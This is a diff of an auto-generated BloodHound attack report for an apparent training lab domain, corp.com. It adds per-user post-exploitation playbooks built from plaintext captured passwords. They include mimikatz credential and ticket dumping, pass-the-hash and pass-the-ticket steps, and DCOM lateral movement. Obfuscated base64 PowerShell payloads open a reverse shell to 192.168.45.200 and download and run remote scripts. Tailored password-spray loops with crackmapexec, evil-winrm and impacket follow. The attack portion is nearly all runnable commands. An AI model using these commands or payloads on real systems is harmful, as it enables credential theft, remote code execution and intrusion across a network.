@@ -1,6 +1,6 @@
 # BloodHound Enhanced Report
 
-**Generated:** 2025-12-03 16:39:32
+**Generated:** 2025-12-03 23:30:07
 
 ---
 
@@ -885,9 +885,9 @@ Targets misconfigured accounts to obtain crackable password hashes without authe
 | JEN@CORP.COM | 3 years ago | False |  |
 | IIS_SERVICE@CORP.COM | 3 years ago | False |  |
 | DAVE@CORP.COM | 3 years ago | False |  |
-| JEFFADMIN@CORP.COM | 2 days ago | True |  |
-| ADMINISTRATOR@CORP.COM | 2 days ago | True | Built-in account for administering the computer/domain |
-| LEON@CORP.COM | 2 days ago | False |  |
+| JEFFADMIN@CORP.COM | 3 days ago | True |  |
+| ADMINISTRATOR@CORP.COM | 3 days ago | True | Built-in account for administering the computer/domain |
+| LEON@CORP.COM | 3 days ago | False |  |
 
 ### ✅ Inactive User Accounts
 **OSCP Relevance:** MEDIUM | **Results:** 9
@@ -902,9 +902,9 @@ Targets misconfigured accounts to obtain crackable password hashes without authe
 | JEFF@CORP.COM | 1 year ago |  |
 | JEN@CORP.COM | 1 year ago |  |
 | JEFFADMIN@CORP.COM | 1 year ago |  |
-| ADMINISTRATOR@CORP.COM | 2 days ago | Built-in account for administering the computer/domain |
-| LEON@CORP.COM | 2 days ago |  |
-| DAVE@CORP.COM | 2 days ago |  |
+| ADMINISTRATOR@CORP.COM | 3 days ago | Built-in account for administering the computer/domain |
+| LEON@CORP.COM | 3 days ago |  |
+| DAVE@CORP.COM | 3 days ago |  |
 
 ### ✅ Enabled vs Disabled Account Ratio
 **OSCP Relevance:** LOW | **Results:** 3
@@ -1035,6 +1035,8 @@ _No direct machine access via BloodHound edges_
 | wmiexec | `impacket-wmiexec 'corp.com/DAVE:Flowers1'@192.168.249.74` |
 | smbexec | `impacket-smbexec 'corp.com/DAVE:Flowers1'@192.168.249.74` |
 | dcomexec | `impacket-dcomexec -object MMC20 'corp.com/DAVE:Flowers1'@192.168.249.74` |
+| evil-winrm | `evil-winrm -i 192.168.249.74 -u DAVE -p 'Flowers1'` |
+| dcom | `$dcom=[System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','192.168.249.74')); $dcom.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c <COMMAND>','7')` |
 
 
 **Technique Comparison**
@@ -1045,6 +1047,8 @@ _No direct machine access via BloodHound edges_
 | wmiexec | MEDIUM | 135 | No service creation, runs as user, uses WMI (legitimate) | No SYSTEM shell, requires RPC, slower than PsExec |
 | smbexec | HIGH | 445 | SYSTEM shell, creates fewer artifacts than PsExec | Service creation, Event Log entries, AV detection |
 | dcomexec | MEDIUM | 135 | Uses DCOM (often overlooked), runs as user | Requires RPC, less reliable than PsExec/WMI |
+| evil-winrm | LOW | 5985,5986 | Interactive PowerShell, file upload/download, stealthy, great for post-exploitation | Requires WinRM enabled, may need firewall exception |
+| dcom | LOW | 135 | Fileless, native PowerShell, no tools needed, often bypasses detection | Requires compromised Windows host to run from, no interactive shell |
 
 ### LEON@CORP.COM
 **Credential:** password
@@ -1059,6 +1063,8 @@ _No direct machine access via BloodHound edges_
 | wmiexec | `impacket-wmiexec 'corp.com/LEON:HomeTaping199!'@192.168.249.74` |
 | smbexec | `impacket-smbexec 'corp.com/LEON:HomeTaping199!'@192.168.249.74` |
 | dcomexec | `impacket-dcomexec -object MMC20 'corp.com/LEON:HomeTaping199!'@192.168.249.74` |
+| evil-winrm | `evil-winrm -i 192.168.249.74 -u LEON -p 'HomeTaping199!'` |
+| dcom | `$dcom=[System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','192.168.249.74')); $dcom.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c <COMMAND>','7')` |
 
 **FILES04.CORP.COM**
 
@@ -1068,6 +1074,8 @@ _No direct machine access via BloodHound edges_
 | wmiexec | `impacket-wmiexec 'corp.com/LEON:HomeTaping199!'@192.168.249.73` |
 | smbexec | `impacket-smbexec 'corp.com/LEON:HomeTaping199!'@192.168.249.73` |
 | dcomexec | `impacket-dcomexec -object MMC20 'corp.com/LEON:HomeTaping199!'@192.168.249.73` |
+| evil-winrm | `evil-winrm -i 192.168.249.73 -u LEON -p 'HomeTaping199!'` |
+| dcom | `$dcom=[System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','192.168.249.73')); $dcom.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c <COMMAND>','7')` |
 
 
 **Technique Comparison**
@@ -1078,6 +1086,8 @@ _No direct machine access via BloodHound edges_
 | wmiexec | MEDIUM | 135 | No service creation, runs as user, uses WMI (legitimate) | No SYSTEM shell, requires RPC, slower than PsExec |
 | smbexec | HIGH | 445 | SYSTEM shell, creates fewer artifacts than PsExec | Service creation, Event Log entries, AV detection |
 | dcomexec | MEDIUM | 135 | Uses DCOM (often overlooked), runs as user | Requires RPC, less reliable than PsExec/WMI |
+| evil-winrm | LOW | 5985,5986 | Interactive PowerShell, file upload/download, stealthy, great for post-exploitation | Requires WinRM enabled, may need firewall exception |
+| dcom | LOW | 135 | Fileless, native PowerShell, no tools needed, often bypasses detection | Requires compromised Windows host to run from, no interactive shell |
 
 #### Authenticated User Attacks (Any Domain User)
 
@@ -1097,107 +1107,689 @@ Replace placeholders with your credentials:
 | GPO Enumeration | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_gpo` |
 
 
-## Password Spraying Methods
+## 🔓 Post-Exploitation Commands
 
-*Based on captured credentials: IIS_SERVICE, DAVE, LEON*
+### DAVE@CORP.COM
+**Credential:** password = `Flowers1`
+
+**Targets (1):** CLIENT74
+
+#### Credential Harvest Order
+
+| # | Command | Priority |
+|---|---------|----------|
+| 1 | `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"` | HIGH |
+| 2 | `mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"` | HIGH |
+| 3 | `mimikatz.exe "privilege::debug" "lsadump::sam" "exit"` | MEDIUM |
+| 4 | `mimikatz.exe "privilege::debug" "lsadump::secrets" "exit"` | MEDIUM |
+| 5 | `mimikatz.exe "privilege::debug" "lsadump::cache" "exit"` | LOW |
+
+#### With Harvested NTLM Hash
+
+```
+mimikatz.exe "sekurlsa::pth /user:DAVE /domain:corp.com /ntlm:<HASH> /run:cmd.exe"
+```
+> ⚠️ Use HOSTNAME not IP after Overpass-the-Hash!
+
+#### Pass-the-Ticket Workflow
+
+**1. EXPORT TICKETS**
+```
+mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
+```
+- Creates .kirbi files in current directory
+- Look for *krbtgt*.kirbi files (TGTs) - HIGHEST PRIORITY
+- TGT format: [session]-2-0-*-user@krbtgt-DOMAIN.kirbi
+
+**2. IDENTIFY VALUABLE TICKETS**
+| Priority | Pattern | Description |
+|----------|---------|-------------|
+| HIGHEST | `*krbtgt*.kirbi` | TGT - Can request ANY service ticket |
+| HIGH | `*cifs*.kirbi` | File share access to specific host |
+| MEDIUM | `*ldap*.kirbi` | LDAP access (enumeration) |
+| LOW | `*http*.kirbi` | Web service access |
+
+**3a. IMPORT TICKET (Windows)**
+```
+# Import
+mimikatz.exe "kerberos::ptt <ticket.kirbi>" "exit"
+# Verify
+klist
+```
+
+**3b. IMPORT TICKET (Kali)**
+```bash
+# Convert
+impacket-ticketConverter <ticket.kirbi> ticket.ccache
+# Set env
+export KRB5CCNAME=$(pwd)/ticket.ccache
+# Verify
+klist
+```
+
+**4. USE THE TICKET**
+> ⚠️ **MUST use HOSTNAME not IP address!**
+
+**Windows:**
+```cmd
+dir \\CLIENT74.domain.com\C$
+type \\CLIENT74.domain.com\C$\Users\Administrator\Desktop\proof.txt
+PsExec.exe \\CLIENT74.domain.com cmd.exe
+```
+
+**Kali:**
+```bash
+impacket-smbclient -k -no-pass CLIENT74.domain.com
+impacket-psexec -k -no-pass user@CLIENT74.domain.com
+impacket-secretsdump -k -no-pass user@CLIENT74.domain.com
+```
+
+**5. VERIFY ACCESS CHANGES**
+
+```bash
+crackmapexec smb CLIENT74.corp.com -u <USER> -p '<PASS>' --shares
+crackmapexec smb CLIENT74.corp.com -k --shares  # With Kerberos ticket
+```
+
+**6. TROUBLESHOOTING**
+
+- **klist shows no tickets after import**
+  - Fix: Re-export on target, check timestamp, verify path to .kirbi
+- **Access denied with valid ticket**
+  - Fix: Use FQDN hostname, check klist expiry, export fresh ticket
+- **KDC_ERR_PREAUTH_REQUIRED**
+  - Fix: Verify KRB5CCNAME path is absolute, domain matches ticket
+
+#### DCOM Lateral Movement (Fileless) -> CLIENT74.CORP.COM
+
+**0. START LISTENER**
+```bash
+rlwrap nc -lvnp 443
+```
+
+**1. INSTANTIATE DCOM OBJECT**
+```powershell
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','CLIENT74.CORP.COM'))
+```
+
+**2. EXECUTE SHELL**
+
+**[A] PowerShell TCP**
+```powershell
+$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAwACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=','7')
+```
+
+**[B] Download Cradle**
+```powershell
+$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADUALgAyADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=','7')
+```
+
+**[C] Powercat**
+```powershell
+$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADUALgAyADAAMAAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACcAKQA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADEAOQAyAC4AMQA2ADgALgA0ADUALgAyADAAMAAgAC0AcAAgADQANAAzACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAA=','7')
+```
+
+**TROUBLESHOOTING**
+- Access denied: Verify local admin, check port 135
+- No shell: Check firewall, verify listener
+
+### LEON@CORP.COM
+**Credential:** password = `HomeTaping199!`
+
+**Targets (2):** CLIENT74, FILES04
+
+#### Credential Harvest Order
+
+| # | Command | Priority |
+|---|---------|----------|
+| 1 | `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"` | HIGH |
+| 2 | `mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"` | HIGH |
+| 3 | `mimikatz.exe "privilege::debug" "lsadump::sam" "exit"` | MEDIUM |
+| 4 | `mimikatz.exe "privilege::debug" "lsadump::secrets" "exit"` | MEDIUM |
+| 5 | `mimikatz.exe "privilege::debug" "lsadump::cache" "exit"` | LOW |
+
+#### With Harvested NTLM Hash
+
+```
+mimikatz.exe "sekurlsa::pth /user:LEON /domain:corp.com /ntlm:<HASH> /run:cmd.exe"
+```
+> ⚠️ Use HOSTNAME not IP after Overpass-the-Hash!
+
+#### Pass-the-Ticket Workflow
+
+**1. EXPORT TICKETS**
+```
+mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
+```
+- Creates .kirbi files in current directory
+- Look for *krbtgt*.kirbi files (TGTs) - HIGHEST PRIORITY
+- TGT format: [session]-2-0-*-user@krbtgt-DOMAIN.kirbi
+
+**2. IDENTIFY VALUABLE TICKETS**
+| Priority | Pattern | Description |
+|----------|---------|-------------|
+| HIGHEST | `*krbtgt*.kirbi` | TGT - Can request ANY service ticket |
+| HIGH | `*cifs*.kirbi` | File share access to specific host |
+| MEDIUM | `*ldap*.kirbi` | LDAP access (enumeration) |
+| LOW | `*http*.kirbi` | Web service access |
+
+**3a. IMPORT TICKET (Windows)**
+```
+# Import
+mimikatz.exe "kerberos::ptt <ticket.kirbi>" "exit"
+# Verify
+klist
+```
+
+**3b. IMPORT TICKET (Kali)**
+```bash
+# Convert
+impacket-ticketConverter <ticket.kirbi> ticket.ccache
+# Set env
+export KRB5CCNAME=$(pwd)/ticket.ccache
+# Verify
+klist
+```
+
+**4. USE THE TICKET**
+> ⚠️ **MUST use HOSTNAME not IP address!**
+
+**Windows:**
+```cmd
+dir \\CLIENT74.domain.com\C$
+type \\CLIENT74.domain.com\C$\Users\Administrator\Desktop\proof.txt
+PsExec.exe \\CLIENT74.domain.com cmd.exe
+```
+
+**Kali:**
+```bash
+impacket-smbclient -k -no-pass CLIENT74.domain.com
+impacket-psexec -k -no-pass user@CLIENT74.domain.com
+impacket-secretsdump -k -no-pass user@CLIENT74.domain.com
+```
+
+**5. VERIFY ACCESS CHANGES**
+
+```bash
+crackmapexec smb CLIENT74.corp.com -u <USER> -p '<PASS>' --shares
+crackmapexec smb CLIENT74.corp.com -k --shares  # With Kerberos ticket
+```
+
+**6. TROUBLESHOOTING**
+
+- **klist shows no tickets after import**
+  - Fix: Re-export on target, check timestamp, verify path to .kirbi
+- **Access denied with valid ticket**
+  - Fix: Use FQDN hostname, check klist expiry, export fresh ticket
+- **KDC_ERR_PREAUTH_REQUIRED**
+  - Fix: Verify KRB5CCNAME path is absolute, domain matches ticket
+
+#### DCOM Lateral Movement (Fileless) -> CLIENT74.CORP.COM
+
+**0. START LISTENER**
+```bash
+rlwrap nc -lvnp 443
+```
+
+**1. INSTANTIATE DCOM OBJECT**
+```powershell
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','CLIENT74.CORP.COM'))
+```
+
+**2. EXECUTE SHELL**
+
+**[A] PowerShell TCP**
+```powershell
+$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAwACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=','7')
+```
+
+**[B] Download Cradle**
+```powershell
+$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADUALgAyADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=','7')
+```
+
+**[C] Powercat**
+```powershell
+$dcom.Document.ActiveView.ExecuteShellCommand('powershell',$null,'-nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADUALgAyADAAMAAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACcAKQA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADEAOQAyAC4AMQA2ADgALgA0ADUALgAyADAAMAAgAC0AcAAgADQANAAzACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAA=','7')
+```
+
+**TROUBLESHOOTING**
+- Access denied: Verify local admin, check port 135
+- No shell: Check firewall, verify listener
+
+
+# Tailored Spray Commands
+
+Based on BloodHound access relationships.
+
+## Summary
+
+- **Users with access:** 7
+- **Target machines:** 3
+- **Access types:** AdminTo, CanPSRemote, CanRDP, ExecuteDCOM
+
+## Local Admin (AdminTo)
+
+7 users, 3 unique target groups
+
+### Group 1: 2 user(s) → 3 target(s)
+
+**Users:** `administrator, jeffadmin`
+
+**Targets:**
+
+- `CLIENT74.CORP.COM` (192.168.249.74)
+- `DC1.CORP.COM` (192.168.249.70)
+- `FILES04.CORP.COM` (192.168.249.73)
+
+#### File-based commands
+
+```bash
+# Create user and target files
+echo -e "administrator\njeffadmin" > users_g1.txt
+echo -e "192.168.249.74\n192.168.249.70\n192.168.249.73" > targets_g1.txt
+crackmapexec smb targets_g1.txt -u users_g1.txt -p '<PASSWORD>'
+```
+
+#### Inline bash loop
+
+```bash
+for user in administrator jeffadmin; do
+  for target in 192.168.249.74 192.168.249.70 192.168.249.73; do
+    crackmapexec smb $target -u $user -p '<PASSWORD>'
+  done
+done
+```
+
+**Alternative protocols:**
+
+```bash
+# WinRM (evil-winrm)
+evil-winrm -i 192.168.249.74 -u administrator -p '<PASSWORD>'
+```
+
+```bash
+# PSExec
+impacket-psexec 'CORP/administrator:<PASSWORD>'@192.168.249.74
+```
+
+```bash
+# WMIExec
+impacket-wmiexec 'CORP/administrator:<PASSWORD>'@192.168.249.74
+```
+
+### Group 2: 2 user(s) → 2 target(s)
+
+**Users:** `jen, leon`
+
+**Targets:**
+
+- `CLIENT74.CORP.COM` (192.168.249.74)
+- `FILES04.CORP.COM` (192.168.249.73)
+
+#### File-based commands
+
+```bash
+# Create user and target files
+echo -e "jen\nleon" > users_g2.txt
+echo -e "192.168.249.74\n192.168.249.73" > targets_g2.txt
+crackmapexec smb targets_g2.txt -u users_g2.txt -p '<PASSWORD>'
+```
+
+#### Inline bash loop
+
+```bash
+for user in jen leon; do
+  for target in 192.168.249.74 192.168.249.73; do
+    crackmapexec smb $target -u $user -p '<PASSWORD>'
+  done
+done
+```
+
+**Alternative protocols:**
+
+```bash
+# WinRM (evil-winrm)
+evil-winrm -i 192.168.249.74 -u jen -p '<PASSWORD>'
+```
+
+```bash
+# PSExec
+impacket-psexec 'CORP/jen:<PASSWORD>'@192.168.249.74
+```
+
+```bash
+# WMIExec
+impacket-wmiexec 'CORP/jen:<PASSWORD>'@192.168.249.74
+```
+
+### Group 3: 3 user(s) → 1 target(s)
+
+**Users:** `dave, jeff, stephanie`
+
+**Targets:**
+
+- `CLIENT74.CORP.COM` (192.168.249.74)
+
+#### File-based commands
+
+```bash
+# Create user and target files
+echo -e "dave\njeff\nstephanie" > users_g3.txt
+echo -e "192.168.249.74" > targets_g3.txt
+crackmapexec smb targets_g3.txt -u users_g3.txt -p '<PASSWORD>'
+```
+
+#### Inline bash loop
+
+```bash
+for user in dave jeff stephanie; do
+  for target in 192.168.249.74; do
+    crackmapexec smb $target -u $user -p '<PASSWORD>'
+  done
+done
+```
+
+**Alternative protocols:**
+
+```bash
+# WinRM (evil-winrm)
+evil-winrm -i 192.168.249.74 -u dave -p '<PASSWORD>'
+```
+
+```bash
+# PSExec
+impacket-psexec 'CORP/dave:<PASSWORD>'@192.168.249.74
+```
+
+```bash
+# WMIExec
+impacket-wmiexec 'CORP/dave:<PASSWORD>'@192.168.249.74
+```
+
+## RDP Access (CanRDP)
+
+4 users, 1 unique target groups
+
+### Group 1: 4 user(s) → 1 target(s)
+
+**Users:** `jeff, jeffadmin, jen, leon`
+
+**Targets:**
+
+- `CLIENT74.CORP.COM` (192.168.249.74)
+
+#### File-based commands
+
+```bash
+# Create user and target files
+echo -e "jeff\njeffadmin\njen\nleon" > users_g1.txt
+echo -e "192.168.249.74" > targets_g1.txt
+xfreerdp /v:targets_g1.txt /u:users_g1.txt /p:'<PASSWORD>' /cert:ignore
+```
+
+#### Inline bash loop
+
+```bash
+for user in jeff jeffadmin jen leon; do
+  for target in 192.168.249.74; do
+    xfreerdp /v:$target /u:$user /p:'<PASSWORD>' /cert:ignore
+  done
+done
+```
+
+**Alternative protocols:**
+
+```bash
+# rdesktop
+rdesktop -u jeff -p '<PASSWORD>' 192.168.249.74
+```
+
+## PS Remoting (CanPSRemote)
+
+1 users, 1 unique target groups
+
+### Group 1: 1 user(s) → 1 target(s)
+
+**Users:** `jeffadmin`
+
+**Targets:**
+
+- `FILES04.CORP.COM` (192.168.249.73)
+
+#### File-based commands
+
+```bash
+# Create user and target files
+echo -e "jeffadmin" > users_g1.txt
+echo -e "192.168.249.73" > targets_g1.txt
+evil-winrm -i targets_g1.txt -u users_g1.txt -p '<PASSWORD>'
+```
+
+#### Inline bash loop
+
+```bash
+for user in jeffadmin; do
+  for target in 192.168.249.73; do
+    evil-winrm -i $target -u $user -p '<PASSWORD>'
+  done
+done
+```
+
+**Alternative protocols:**
+
+```bash
+# WinRM (CrackMapExec)
+crackmapexec winrm 192.168.249.73 -u jeffadmin -p '<PASSWORD>'
+```
+
+## DCOM Execution (ExecuteDCOM)
+
+1 users, 1 unique target groups
+
+### Group 1: 1 user(s) → 1 target(s)
+
+**Users:** `jen`
+
+**Targets:**
+
+- `CLIENT74.CORP.COM` (192.168.249.74)
+
+#### File-based commands
+
+```bash
+# Create user and target files
+echo -e "jen" > users_g1.txt
+echo -e "192.168.249.74" > targets_g1.txt
+impacket-dcomexec 'CORP/users_g1.txt:<PASSWORD>'@targets_g1.txt
+```
+
+#### Inline bash loop
+
+```bash
+for user in jen; do
+  for target in 192.168.249.74; do
+    impacket-dcomexec 'CORP/$user:<PASSWORD>'@$target
+  done
+done
+```
+
+## Monolithic Spray
+
+One attempt per user on their best target. Set `PASSWORD` once at the top.
+
+### Edge Selection Logic
+
+```
+  7 users via AdminTo (local admin → SMB auth)
+  0 users via CanRDP (RDP → xfreerdp3 auth) - 4 avoided (had better options)
+  Priority: AdminTo > CanPSRemote > CanRDP > ExecuteDCOM > ReadLAPSPassword
+  Each user sprayed exactly once on their highest-privilege target
+```
+
+### Commands
+
+```bash
+PASSWORD='<PASSWORD>'
+
+# --- administrator → 192.168.249.74 (CLIENT74) ---
+# AdminTo via domain admins: MATCH (administrator)-[:MemberOf*]->(domain admins)-[:AdminTo]->(CLIENT74)
+crackmapexec smb 192.168.249.74 -u administrator -p "$PASSWORD"
+
+# --- dave → 192.168.249.74 (CLIENT74) ---
+# AdminTo (direct): MATCH (dave)-[:AdminTo]->(CLIENT74)
+crackmapexec smb 192.168.249.74 -u dave -p "$PASSWORD"
+
+# --- jeff → 192.168.249.74 (CLIENT74) ---
+# AdminTo (direct): MATCH (jeff)-[:AdminTo]->(CLIENT74)
+# Note: User also has CanRDP, using AdminTo instead
+crackmapexec smb 192.168.249.74 -u jeff -p "$PASSWORD"
+
+# --- jeffadmin → 192.168.249.74 (CLIENT74) ---
+# AdminTo via domain admins: MATCH (jeffadmin)-[:MemberOf*]->(domain admins)-[:AdminTo]->(CLIENT74)
+# Note: User also has CanRDP, using AdminTo instead
+crackmapexec smb 192.168.249.74 -u jeffadmin -p "$PASSWORD"
+
+# --- jen → 192.168.249.74 (CLIENT74) ---
+# AdminTo (direct): MATCH (jen)-[:AdminTo]->(CLIENT74)
+# Note: User also has CanRDP, using AdminTo instead
+crackmapexec smb 192.168.249.74 -u jen -p "$PASSWORD"
+
+# --- leon → 192.168.249.74 (CLIENT74) ---
+# AdminTo (direct): MATCH (leon)-[:AdminTo]->(CLIENT74)
+# Note: User also has CanRDP, using AdminTo instead
+crackmapexec smb 192.168.249.74 -u leon -p "$PASSWORD"
+
+# --- stephanie → 192.168.249.74 (CLIENT74) ---
+# AdminTo (direct): MATCH (stephanie)-[:AdminTo]->(CLIENT74)
+crackmapexec smb 192.168.249.74 -u stephanie -p "$PASSWORD"
+
+```
+
+---
+
+> **NOTE:** Replace `<PASSWORD>` with actual credentials.
+
+
+## 🔑 Password Spray Recommendations
+
+### Captured Passwords
+
+```
+Strawberry1
+Flowers1
+HomeTaping199!
+```
 
 ### Password Policy
 
-| Setting | Value |
-|---------|-------|
-| Lockout threshold | 5 attempts |
-| Lockout duration | 30 minutes |
-| Observation window | 30 minutes |
-
-**Safe Spray Parameters:**
-- Attempts per round: **4**
-- Delay between: **30 minutes**
+- Lockout threshold: **5** attempts
+- Lockout duration: **30** minutes
+- Safe to spray: **4** passwords every **30** min
 
 ### Spray Methods
 
-#### METHOD 1: SMB-Based Spray (crackmapexec/netexec)
-*Ports: 445 | Noise: HIGH*
+#### Method 1: SMB-Based Spray (crackmapexec/netexec)
+
+Ports: 445 | Noise: HIGH
 
 ```bash
 crackmapexec smb 192.168.249.70 -u users.txt -p 'Strawberry1' -d corp.com --continue-on-success
-crackmapexec smb 192.168.249.70 -u users.txt -p 'Flowers1' -d corp.com --continue-on-success
-crackmapexec smb 192.168.249.70 -u users.txt -p 'HomeTaping199!' -d corp.com --continue-on-success
 ```
+```bash
+crackmapexec smb 192.168.249.70 -u users.txt -p 'Flowers1' -d corp.com --continue-on-success
+```
+- ✅ Shows admin access (Pwn3d!), validates creds + checks admin in one step
+- ❌ Very noisy (Event logs 4625), triggers lockouts, detected by EDR
 
-- **+** Shows admin access (Pwn3d!), validates creds + checks admin in one step
-- **-** Very noisy (Event logs 4625), triggers lockouts, detected by EDR
+#### Method 2: Kerberos TGT-Based Spray (kerbrute)
 
